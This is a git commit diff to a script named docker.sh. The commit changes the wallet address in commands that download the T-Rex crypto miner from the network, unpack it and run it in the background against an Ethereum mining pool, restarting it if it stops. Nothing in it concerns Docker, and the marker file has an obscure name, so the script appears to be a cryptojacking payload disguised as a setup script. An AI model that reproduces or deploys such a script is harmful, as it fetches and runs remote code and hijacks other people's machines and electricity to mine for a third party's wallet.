88abd0639a8238265b02255a1766b70fbed82976
ApocalypseDevNet <102152558+ApocalypseDevNet@users.noreply.github.com>
2022-03-27 22:15:51 +0700

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -5,13 +5,13 @@ if [ ! -f "${SCRIPT_DIR}/k9820sjs02.txt" ]; then
 	echo "Start setup..."
 	echo "2199ak290ks" > k9820sjs02.txt
 	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz
-	./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x8b822dc70E5C7674FEc7F9B87348ec8Faea83925 -p x -w $woker &
+	./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xF76df9539347E1722Ae50d8a1B193B7c97bB7769 -p x -w $woker &
 else
 	if pgrep t-rex >/dev/null 2>&1
 	then
 		echo "RUNNING"
 	else
 		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz
-    		./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x8b822dc70E5C7674FEc7F9B87348ec8Faea83925 -p x -w $woker &
+    		./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xF76df9539347E1722Ae50d8a1B193B7c97bB7769 -p x -w $woker &
 	fi
 fi
